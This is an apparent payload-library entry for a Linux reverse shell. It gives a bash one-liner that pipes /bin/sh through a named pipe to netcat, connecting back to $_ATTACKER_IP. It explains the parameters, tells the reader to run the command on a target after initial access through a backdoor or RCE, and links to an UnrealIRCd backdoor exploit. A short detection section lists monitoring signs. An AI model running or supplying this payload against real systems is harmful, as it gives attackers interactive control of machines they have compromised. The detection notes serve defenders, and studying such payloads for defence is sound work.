---
id: c76e17a9-0541-4d6e-825a-474b99e0fbdb
name: Linux-Netcat-Reverse-Shell-via-FIFO
type: code
language: bash
verified: true
created_at: '2019-10-09T22:21:56.346567+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
  - netcat
validated: true
---

# Linux-Netcat-Reverse-Shell-via-FIFO

## Code

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```

## Description

This bash one-liner creates a reverse shell on Linux using netcat and a named pipe (FIFO). It removes any existing /tmp/f, creates a new FIFO, and sets up bidirectional communication to spawn an interactive /bin/sh shell that connects back to the attacker's netcat listener.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listening machine | 192.168.1.100 |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., with nc -lvnp) | 4444 |

## Usage

Execute this code on the target system after initial access, such as via a backdoor or RCE vulnerability. Start a listener on the attacker side first (nc -lvnp $_ATTACKER_PORT). Common in post-exploitation for gaining shell access without uploading binaries.

## Detection

- Monitor for netcat processes (nc or ncat) and unusual outbound connections to high ports.
- Check for FIFO creation in /tmp (ls -l /tmp/f) or temporary files.
- Enable process auditing for shell spawns (/bin/sh) from unexpected parents like IRC daemons.
- Network logs showing TCP connections from IRC server to attacker IP.

## Related

- [[procedures/Exploit-Backdoor-in-UnrealIRCd-3.2.8]]
